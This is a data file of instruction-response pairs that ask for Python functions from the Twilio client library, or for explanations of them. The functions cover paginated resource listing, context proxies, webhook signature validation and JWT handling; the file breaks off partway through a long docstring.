{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskQueueRealTimeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['task_queue_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the FormList Twilio Domain", "response": "def forms(self):\n        \"\"\"\n        :rtype: twilio.rest.authy.v1.form.FormList\n        \"\"\"\n        if self._forms is None:\n            self._forms = FormList(self)\n        return self._forms"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconstructs a CredentialListMappingContext :param sid: A string that identifies the resource to fetch :returns: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingContext :rtype: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a CredentialListMappingContext\n\n        :param sid: A string that identifies the resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingContext\n        \"\"\"\n        return CredentialListMappingContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return CredentialListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )", "response": "Build an instance of CredentialListMappingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef stream(self, log=values.unset, message_date_before=values.unset,\n               message_date=values.unset, message_date_after=values.unset,\n               limit=None, page_size=None):\n        \"\"\"\n        Streams NotificationInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode log: Filter by log level\n        :param date message_date_before: Filter by date\n        :param date message_date: Filter by date\n        :param date message_date_after: Filter by date\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.call.notification.NotificationInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            log=log,\n            message_date_before=message_date_before,\n            message_date=message_date,\n            message_date_after=message_date_after,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams the NotificationInstance records from the API as a generator. This operation lazily loads the NotificationInstance records from the API as efficiently as possible until the limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef list(self, log=values.unset, message_date_before=values.unset,\n             message_date=values.unset, message_date_after=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists NotificationInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode log: Filter by log level\n        :param date message_date_before: Filter by date\n        :param date message_date: Filter by date\n        :param date message_date_after: Filter by date\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.call.notification.NotificationInstance]\n        \"\"\"\n        return list(self.stream(\n            log=log,\n            message_date_before=message_date_before,\n            message_date=message_date,\n            message_date_after=message_date_after,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the NotificationInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef page(self, log=values.unset, message_date_before=values.unset,\n             message_date=values.unset, message_date_after=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of NotificationInstance records from the API.\n        Request is executed immediately\n\n        :param unicode log: Filter by log level\n        :param date message_date_before: Filter by date\n        :param date message_date: Filter by date\n        :param date message_date_after: Filter by date\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of NotificationInstance\n        :rtype: twilio.rest.api.v2010.account.call.notification.NotificationPage\n        \"\"\"\n        params = values.of({\n            'Log': log,\n            'MessageDate<': serialize.iso8601_date(message_date_before),\n            'MessageDate': serialize.iso8601_date(message_date),\n            'MessageDate>': serialize.iso8601_date(message_date_after),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return NotificationPage(self._version, response, self._solution)", "response": "Retrieve a single page of NotificationInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return NotificationContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n            sid=sid,\n        )", "response": "Constructs a NotificationContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.call.notification.NotificationContext\n        :rtype: twilio.rest.api.v2010.account.call.notification.NotificationContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstream CountryInstance records from the API as a generator.", "response": "def stream(self, iso_code=values.unset, continent=values.unset,\n               country_code=values.unset, low_risk_numbers_enabled=values.unset,\n               high_risk_special_numbers_enabled=values.unset,\n               high_risk_tollfraud_numbers_enabled=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams CountryInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode iso_code: Filter to retrieve the country permissions by specifying the ISO country code\n        :param unicode continent: Filter to retrieve the country permissions by specifying the continent\n        :param unicode country_code: Country code filter\n        :param bool low_risk_numbers_enabled: Filter to retrieve the country permissions with dialing to low-risk numbers enabled\n        :param bool high_risk_special_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk special service numbers enabled\n        :param bool high_risk_tollfraud_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk toll fraud numbers enabled\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.voice.v1.dialing_permissions.country.CountryInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            iso_code=iso_code,\n            continent=continent,\n            country_code=country_code,\n            low_risk_numbers_enabled=low_risk_numbers_enabled,\n            high_risk_special_numbers_enabled=high_risk_special_numbers_enabled,\n            high_risk_tollfraud_numbers_enabled=high_risk_tollfraud_numbers_enabled,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfetches a list of CountryInstance records from the API.", "response": "def list(self, iso_code=values.unset, continent=values.unset,\n             country_code=values.unset, low_risk_numbers_enabled=values.unset,\n             high_risk_special_numbers_enabled=values.unset,\n             high_risk_tollfraud_numbers_enabled=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists CountryInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode iso_code: Filter to retrieve the country permissions by specifying the ISO country code\n        :param unicode continent: Filter to retrieve the country permissions by specifying the continent\n        :param unicode country_code: Country code filter\n        :param bool low_risk_numbers_enabled: Filter to retrieve the country permissions with dialing to low-risk numbers enabled\n        :param bool high_risk_special_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk special service numbers enabled\n        :param bool high_risk_tollfraud_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk toll fraud numbers enabled\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.voice.v1.dialing_permissions.country.CountryInstance]\n        \"\"\"\n        return list(self.stream(\n            iso_code=iso_code,\n            continent=continent,\n            country_code=country_code,\n            low_risk_numbers_enabled=low_risk_numbers_enabled,\n            high_risk_special_numbers_enabled=high_risk_special_numbers_enabled,\n            high_risk_tollfraud_numbers_enabled=high_risk_tollfraud_numbers_enabled,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nretrieving a single page of CountryInstance records from the API.", "response": "def page(self, iso_code=values.unset, continent=values.unset,\n             country_code=values.unset, low_risk_numbers_enabled=values.unset,\n             high_risk_special_numbers_enabled=values.unset,\n             high_risk_tollfraud_numbers_enabled=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of CountryInstance records from the API.\n        Request is executed immediately\n\n        :param unicode iso_code: Filter to retrieve the country permissions by specifying the ISO country code\n        :param unicode continent: Filter to retrieve the country permissions by specifying the continent\n        :param unicode country_code: Country code filter\n        :param bool low_risk_numbers_enabled: Filter to retrieve the country permissions with dialing to low-risk numbers enabled\n        :param bool high_risk_special_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk special service numbers enabled\n        :param bool high_risk_tollfraud_numbers_enabled: Filter to retrieve the country permissions with dialing to high-risk toll fraud numbers enabled\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of CountryInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.country.CountryPage\n        \"\"\"\n        params = values.of({\n            'IsoCode': iso_code,\n            'Continent': continent,\n            'CountryCode': country_code,\n            'LowRiskNumbersEnabled': low_risk_numbers_enabled,\n            'HighRiskSpecialNumbersEnabled': high_risk_special_numbers_enabled,\n            'HighRiskTollfraudNumbersEnabled': high_risk_tollfraud_numbers_enabled,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CountryPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CountryInstance(self._version, payload, iso_code=self._solution['iso_code'], )", "response": "Fetch a CountryInstance\n\n        :returns: Fetched CountryInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.country.CountryInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef highrisk_special_prefixes(self):\n        if self._highrisk_special_prefixes is None:\n            self._highrisk_special_prefixes = HighriskSpecialPrefixList(\n                self._version,\n                iso_code=self._solution['iso_code'],\n            )\n        return self._highrisk_special_prefixes", "response": "Access the highrisk special prefixes of a resource."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = CountryContext(self._version, iso_code=self._solution['iso_code'], )\n        return self._context", "response": "Generate an instance context for the country"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, sid=values.unset, phone_number=values.unset,\n               is_reserved=values.unset):\n        \"\"\"\n        Create a new PhoneNumberInstance\n\n        :param unicode sid: The SID of a Twilio IncomingPhoneNumber resource\n        :param unicode phone_number: The phone number in E.164 format\n        :param bool is_reserved: Whether the new phone number should be reserved\n\n        :returns: Newly created PhoneNumberInstance\n        :rtype: twilio.rest.proxy.v1.service.phone_number.PhoneNumberInstance\n        \"\"\"\n        data = values.of({'Sid': sid, 'PhoneNumber': phone_number, 'IsReserved': is_reserved, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return PhoneNumberInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new PhoneNumberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, sid):\n        return PhoneNumberContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )", "response": "Constructs a PhoneNumberContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.proxy.v1.service.phone_number.PhoneNumberContext\n        :rtype: twilio.rest.proxy.v1.service.phone_number.PhoneNumberContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds an instance of PhoneNumberInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of PhoneNumberInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.proxy.v1.service.phone_number.PhoneNumberInstance\n        :rtype: twilio.rest.proxy.v1.service.phone_number.PhoneNumberInstance\n        \"\"\"\n        return PhoneNumberInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = PhoneNumberContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource that is capable of performing various actions."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfetches a CompositionSettingsInstance :returns: Fetched CompositionSettingsInstance :rtype: twilio.rest.video.v1.composition_settings.CompositionSettingsInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a CompositionSettingsInstance\n\n        :returns: Fetched CompositionSettingsInstance\n        :rtype: twilio.rest.video.v1.composition_settings.CompositionSettingsInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CompositionSettingsInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate an instance context for the composition_settings", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CompositionSettingsContext for this CompositionSettingsInstance\n        :rtype: twilio.rest.video.v1.composition_settings.CompositionSettingsContext\n        \"\"\"\n        if self._context is None:\n            self._context = CompositionSettingsContext(self._version, )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomparing two strings while protecting against timing attacks", "response": "def compare(string1, string2):\n    \"\"\"Compare two strings while protecting against timing attacks\n\n    :param str string1: the first string\n    :param str string2: the second string\n\n    :returns: True if the strings are equal, False if not\n    :rtype: :obj:`bool`\n    \"\"\"\n    if len(string1) != len(string2):\n        return False\n    result = True\n    for c1, c2 in izip(string1, string2):\n        result &= c1 == c2\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove the port number from a URI", "response": "def remove_port(uri):\n    \"\"\"Remove the port number from a URI\n\n    :param uri: full URI that Twilio requested on your server\n\n    :returns: full URI without a port number\n    :rtype: str\n    \"\"\"\n    new_netloc = uri.netloc.split(':')[0]\n    new_uri = uri._replace(netloc=new_netloc)\n    return new_uri.geturl()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef compute_signature(self, uri, params, utf=PY3):\n        s = uri\n        if len(params) > 0:\n            for k, v in sorted(params.items()):\n                s += k + v\n\n        # compute signature and compare signatures\n        mac = hmac.new(self.token, s.encode(\"utf-8\"), sha1)\n        computed = base64.b64encode(mac.digest())\n        if utf:\n            computed = computed.decode('utf-8')\n\n        return computed.strip()", "response": "Compute the signature for a given request."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef validate(self, uri, params, signature):\n        if params is None:\n            params = {}\n\n        parsed_uri = urlparse(uri)\n        if parsed_uri.scheme == \"https\" and parsed_uri.port:\n            uri = remove_port(parsed_uri)\n\n        valid_signature = False  # Default fail\n        valid_body_hash = True  # May not receive body hash, so default succeed\n\n        query = parse_qs(parsed_uri.query)\n        if \"bodySHA256\" in query and isinstance(params, string_types):\n            valid_body_hash = compare(self.compute_hash(params), query[\"bodySHA256\"][0])\n            valid_signature = compare(self.compute_signature(uri, {}), signature)\n        else:\n            valid_signature = compare(self.compute_signature(uri, params), signature)\n\n        return valid_signature and valid_body_hash", "response": "Validate a request from Twilio."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nclass specific implementation of from_jwt which should take jwt components and return and instance of this Class with jwt information loaded. :return: Jwt object containing the headers, payload and key", "response": "def _from_jwt(cls, headers, payload, key=None):\n        \"\"\"\n        Class specific implementation of from_jwt which should take jwt components and return\n        and instance of this Class with jwt information loaded.\n        :return: Jwt object containing the headers, payload and key\n        \"\"\"\n        jwt = Jwt(\n            secret_key=key,\n            issuer=payload.get('iss', None),\n            subject=payload.get('sub', None),\n            algorithm=headers.get('alg', None),\n            valid_until=payload.get('exp', None),\n            nbf=payload.get('nbf', None),\n        )\n        jwt.__decoded_payload = payload\n        jwt.__decoded_headers = headers\n        return jwt"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nencode this object into a JWT string.", "response": "def to_jwt(self, algorithm=None, ttl=None):\n        \"\"\"\n        Encode this JWT object into a JWT string\n        :param str algorithm: override the algorithm used to encode the JWT\n        :param int ttl: override the ttl configured in the constructor\n        :rtype: str The JWT string\n        \"\"\"\n\n        if not self.secret_key:\n            raise ValueError('JWT does not have a signing key configured.')\n\n        headers = self.headers.copy()\n        if algorithm:\n            headers['alg'] = algorithm\n        algorithm = algorithm or self.algorithm\n\n        payload = self.payload.copy()\n        if ttl:\n            payload['exp'] = int(time.time()) + ttl\n\n        return jwt_lib.encode(payload, self.secret_key, algorithm=algorithm, headers=headers)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndecoding a JWT string into a Jwt object.", "response": "def from_jwt(cls, jwt, key=''):\n        \"\"\"\n        Decode a JWT string into a Jwt object\n        :param str jwt: JWT string\n        :param Optional[str] key: key used to verify JWT signature, if not provided then validation\n                                  is skipped.\n        :raises JwtDecodeError if decoding JWT fails for any reason.\n        :return: A DecodedJwt object containing the jwt information.\n        \"\"\"\n        verify = True if key else False\n\n        try:\n            payload = jwt_lib.decode(bytes(jwt), key, options={\n                'verify_signature': verify,\n                'verify_exp': True,\n                'verify_nbf': True,\n            })\n            headers = jwt_lib.get_unverified_header(jwt)\n        except Exception as e:\n            raise JwtDecodeError(getattr(e, 'message', str(e)))\n\n        return cls._from_jwt(headers, payload, key)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of DefaultsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of DefaultsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance\n        \"\"\"\n        return DefaultsInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the DefaultsInstance :param dict defaults: A JSON string that describes the default task links. :returns: Updated DefaultsInstance :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance", "response": "def update(self, defaults=values.unset):\n        \"\"\"\n        Update the DefaultsInstance\n\n        :param dict defaults: A JSON string that describes the default task links.\n\n        :returns: Updated DefaultsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance\n        \"\"\"\n        data = values.of({'Defaults': serialize.object(defaults), })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DefaultsInstance(self._version, payload, assistant_sid=self._solution['assistant_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = DefaultsContext(self._version, assistant_sid=self._solution['assistant_sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the DefaultsInstance :param dict defaults: A JSON string that describes the default task links. :returns: Updated DefaultsInstance :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance", "response": "def update(self, defaults=values.unset):\n        \"\"\"\n        Update the DefaultsInstance\n\n        :param dict defaults: A JSON string that describes the default task links.\n\n        :returns: Updated DefaultsInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.defaults.DefaultsInstance\n        \"\"\"\n        return self._proxy.update(defaults=defaults, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the ServiceInstance :param unicode friendly_name: Human-readable name for this service instance :param unicode default_service_role_sid: The default_service_role_sid :param unicode default_channel_role_sid: Channel role assigned on channel join :param unicode default_channel_creator_role_sid: Channel role assigned to creator of channel when joining for first time :param bool read_status_enabled: true if the member read status feature is enabled, false if not. :param bool reachability_enabled: true if the reachability feature should be enabled. :param unicode typing_indicator_timeout: ISO 8601 duration indicating the timeout after \"started typing\" event when client should assume that user is not typing anymore even if no \"ended typing\" message received :param unicode consumption_report_interval: ISO 8601 duration indicating the interval between consumption reports sent from client endpoints. :param bool notifications_new_message_enabled: The notifications.new_message.enabled :param unicode notifications_new_message_template: The notifications.new_message.template :param bool notifications_added_to_channel_enabled: The notifications.added_to_channel.enabled :param unicode notifications_added_to_channel_template: The notifications.added_to_channel.template :param bool notifications_removed_from_channel_enabled: The notifications.removed_from_channel.enabled :param unicode notifications_removed_from_channel_template: The notifications.removed_from_channel.template :param bool notifications_invited_to_channel_enabled: The notifications.invited_to_channel.enabled :param unicode notifications_invited_to_channel_template: The notifications.invited_to_channel.template :param unicode pre_webhook_url: The webhook URL for PRE-Event webhooks. :param unicode post_webhook_url: The webhook URL for POST-Event webhooks. :param unicode webhook_method: The webhook request format to use. :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance. :param unicode webhooks_on_message_send_url: The webhooks.on_message_send.url :param unicode webhooks_on_message_send_method: The webhooks.on_message_send.method :param unicode webhooks_on_message_send_format: The webhooks.on_message_send.format :param unicode webhooks_on_message_update_url: The webhooks.on_message_update.url :param unicode webhooks_on_message_update_method: The webhooks.on_message_update.method :param unicode webhooks_on_message_update_format: The webhooks.on_message_update.format :param unicode webhooks_on_message_remove_url: The webhooks.on_message_remove.url :param unicode webhooks_on_message_remove_method: The webhooks.on_message_remove.method :param unicode webhooks_on_message_remove_format: The webhooks.on_message_remove.format :param unicode webhooks_on_channel_add_url: The webhooks.on_channel_add.url :param unicode webhooks_on_channel_add_method: The webhooks.on_channel_add.method :param unicode webhooks_on_channel_add_format: The webhooks.on_channel_add.format :param unicode webhooks_on_channel_destroy_url: The webhooks.on_channel_destroy.url :param unicode webhooks_on_channel_destroy_method: The webhooks.on_channel_destroy.method :param unicode webhooks_on_channel_destroy_format: The webhooks.on_channel_destroy.format :param unicode webhooks_on_channel_update_url: The webhooks.on_channel_update.url :param unicode webhooks_on_channel_update_method: The webhooks.on_channel_update.method :param unicode webhooks_on_channel_update_format: The webhooks.on_channel_update.format :param unicode webhooks_on_member_add_url: The webhooks.on_member_add.url :param unicode webhooks_on_member_add_method: The webhooks.on_member_add.method :param unicode webhooks_on_member_add_format: The webhooks.on_member_add.format :param unicode webhooks_on_member_remove_url: The webhooks.on_member_remove.url :param unicode webhooks_on_member_remove_method: The webhooks.on_member_remove.method :param unicode webhooks_on_member_remove_format: The webhooks.on_member_remove.format :param unicode webhooks_on_message_sent_url: The webhooks.on_message_sent.url :param unicode webhooks_on_message_sent_method: The webhooks.on_message_sent.method :param unicode webhooks_on_message_sent_format: The webhooks.on_message_sent.format :param unicode webhooks_on_message_updated_url: The webhooks.on_message_updated.url :param unicode webhooks_on_message_updated_method: The webhooks.on_message_updated.method :param unicode webhooks_on_message_updated_format: The webhooks.on_message_updated.format :param unicode webhooks_on_message_removed_url: The webhooks.on_message_removed.url :param unicode webhooks_on_message_removed_method: The webhooks.on_message_removed.method :param unicode webhooks_on_message_removed_format: The webhooks.on_message_removed.format :param unicode webhooks_on_channel_added_url: The webhooks.on_channel_added.url :param unicode webhooks_on_channel_added_method: The webhooks.on_channel_added.method :param unicode webhooks_on_channel_added_format: The webhooks.on_channel_added.format :param unicode webhooks_on_channel_destroyed_url: The webhooks.on_channel_destroyed.url :param unicode webhooks_on_channel_destroyed_method: The webhooks.on_channel_destroyed.method :param unicode webhooks_on_channel_destroyed_format: The webhooks.on_channel_destroyed.format :param unicode webhooks_on_channel_updated_url: The webhooks.on_channel_updated.url :param unicode webhooks_on_channel_updated_method: The webhooks.on_channel_updated.method :param unicode webhooks_on_channel_updated_format: The webhooks.on_channel_updated.format :param unicode webhooks_on_member_added_url: The webhooks.on_member_added.url :param unicode webhooks_on_member_added_method: The webhooks.on_member_added.method :param unicode webhooks_on_member_added_format: The webhooks.on_member_added.format :param unicode webhooks_on_member_removed_url: The webhooks.on_member_removed.url :param unicode webhooks_on_member_removed_method: The webhooks.on_member_removed.method :param unicode webhooks_on_member_removed_format: The webhooks.on_member_removed.format :param unicode limits_channel_members: The limits.channel_members :param unicode limits_user_channels: The limits.user_channels :returns: Updated ServiceInstance :rtype: twilio.rest.chat.v1.service.ServiceInstance", "response": "def update(self, friendly_name=values.unset,\n               default_service_role_sid=values.unset,\n               default_channel_role_sid=values.unset,\n               default_channel_creator_role_sid=values.unset,\n               read_status_enabled=values.unset, reachability_enabled=values.unset,\n               typing_indicator_timeout=values.unset,\n               consumption_report_interval=values.unset,\n               notifications_new_message_enabled=values.unset,\n               notifications_new_message_template=values.unset,\n               notifications_added_to_channel_enabled=values.unset,\n               notifications_added_to_channel_template=values.unset,\n               notifications_removed_from_channel_enabled=values.unset,\n               notifications_removed_from_channel_template=values.unset,\n               notifications_invited_to_channel_enabled=values.unset,\n               notifications_invited_to_channel_template=values.unset,\n               pre_webhook_url=values.unset, post_webhook_url=values.unset,\n               webhook_method=values.unset, webhook_filters=values.unset,\n               webhooks_on_message_send_url=values.unset,\n               webhooks_on_message_send_method=values.unset,\n               webhooks_on_message_send_format=values.unset,\n               webhooks_on_message_update_url=values.unset,\n               webhooks_on_message_update_method=values.unset,\n               webhooks_on_message_update_format=values.unset,\n               webhooks_on_message_remove_url=values.unset,\n               webhooks_on_message_remove_method=values.unset,\n               webhooks_on_message_remove_format=values.unset,\n               webhooks_on_channel_add_url=values.unset,\n               webhooks_on_channel_add_method=values.unset,\n               webhooks_on_channel_add_format=values.unset,\n               webhooks_on_channel_destroy_url=values.unset,\n               webhooks_on_channel_destroy_method=values.unset,\n               webhooks_on_channel_destroy_format=values.unset,\n               webhooks_on_channel_update_url=values.unset,\n               webhooks_on_channel_update_method=values.unset,\n               webhooks_on_channel_update_format=values.unset,\n               webhooks_on_member_add_url=values.unset,\n               webhooks_on_member_add_method=values.unset,\n               webhooks_on_member_add_format=values.unset,\n               webhooks_on_member_remove_url=values.unset,\n               webhooks_on_member_remove_method=values.unset,\n               webhooks_on_member_remove_format=values.unset,\n               webhooks_on_message_sent_url=values.unset,\n               webhooks_on_message_sent_method=values.unset,\n               webhooks_on_message_sent_format=values.unset,\n               webhooks_on_message_updated_url=values.unset,\n               webhooks_on_message_updated_method=values.unset,\n               webhooks_on_message_updated_format=values.unset,\n               webhooks_on_message_removed_url=values.unset,\n               webhooks_on_message_removed_method=values.unset,\n               webhooks_on_message_removed_format=values.unset,\n               webhooks_on_channel_added_url=values.unset,\n               webhooks_on_channel_added_method=values.unset,\n               webhooks_on_channel_added_format=values.unset,\n               webhooks_on_channel_destroyed_url=values.unset,\n               webhooks_on_channel_destroyed_method=values.unset,\n               webhooks_on_channel_destroyed_format=values.unset,\n               webhooks_on_channel_updated_url=values.unset,\n               webhooks_on_channel_updated_method=values.unset,\n               webhooks_on_channel_updated_format=values.unset,\n               webhooks_on_member_added_url=values.unset,\n               webhooks_on_member_added_method=values.unset,\n               webhooks_on_member_added_format=values.unset,\n               webhooks_on_member_removed_url=values.unset,\n               webhooks_on_member_removed_method=values.unset,\n               webhooks_on_member_removed_format=values.unset,\n               limits_channel_members=values.unset,\n               limits_user_channels=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: Human-readable name for this service instance\n        :param unicode default_service_role_sid: The default_service_role_sid\n        :param unicode default_channel_role_sid: Channel role assigned on channel join\n        :param unicode default_channel_creator_role_sid: Channel role assigned to creator of channel when joining for first time\n        :param bool read_status_enabled: true if the member read status feature is enabled, false if not.\n        :param bool reachability_enabled: true if the reachability feature should be enabled.\n        :param unicode typing_indicator_timeout: ISO 8601 duration indicating the timeout after \"started typing\" event when client should assume that user is not typing anymore even if no \"ended typing\" message received\n        :param unicode consumption_report_interval: ISO 8601 duration indicating the interval between consumption reports sent from client 